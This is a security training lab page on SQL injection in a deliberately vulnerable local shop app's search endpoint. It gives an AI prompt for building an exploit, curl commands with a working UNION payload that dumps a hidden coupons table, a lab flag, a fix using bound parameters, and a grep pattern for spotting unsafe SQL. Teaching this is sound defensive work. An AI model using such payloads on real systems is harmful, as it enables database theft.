# F6 SQL injection in product search

| | |
|---|---|
| Chapter | CH4 Lab A05 |
| Category | A05 Injection (SQL), with A10 error leakage |
| Where | `GET /api/search?q=` |
| You win when | The search returns `FLAG{...}` from the hidden `coupons` table |

## Attacker prompt

```text
I am testing LabShop, a deliberately vulnerable training app on my own laptop at
http://127.0.0.1:3000. I own it.

Read app/api/search/route.js and db/schema.sql. Explain how the search query is built and
whether input can change the SQL. Build a UNION payload that returns rows from the coupons
table, matching the three columns the query selects, and give me the curl command with the
payload URL-encoded. Do not change any code yet.
```

## Exploit by hand

First make it fail, to see what the error tells an attacker:

```bash
curl -s "http://127.0.0.1:3000/api/search?q=%27"
```

Then dump the hidden table:

```bash
curl -s "http://127.0.0.1:3000/api/search?q=zzz%27%20UNION%20SELECT%20id%2C%20code%2C%20percent_off%20FROM%20coupons%20--"
```

## Fixer prompt

```text
The search route builds SQL by pasting the q parameter into the string, so input can rewrite
the query. It also returns the raw SQL error to the client.

1. Use a bound parameter: name LIKE ? with params ['%' + q + '%']. Never concatenate input into SQL.
2. Log the error detail on the server with console.error and return only "Search failed".
Keep a normal search for "kopi" working. Explain why escaping quotes by hand is not the fix.
```

## Proof

```bash
sh scripts/proof.sh F6
```

| | Output |
|---|---|
| Before | `[..., {"name":"FLAG{union-select-dumps-hidden-tables}", ...}]` |
| After | `[]` |

## Your own app

Search for SQL built with template strings or `+`:

```bash
grep -rn -E "(SELECT|INSERT|UPDATE|DELETE).*(\\\$\{|\" *\+|' *\+)" --include=*.js --include=*.ts --include=*.py .
```

Supabase users: check `rpc()` functions that use `EXECUTE` with string concatenation, and use `format('%I', ...)` or parameters instead.
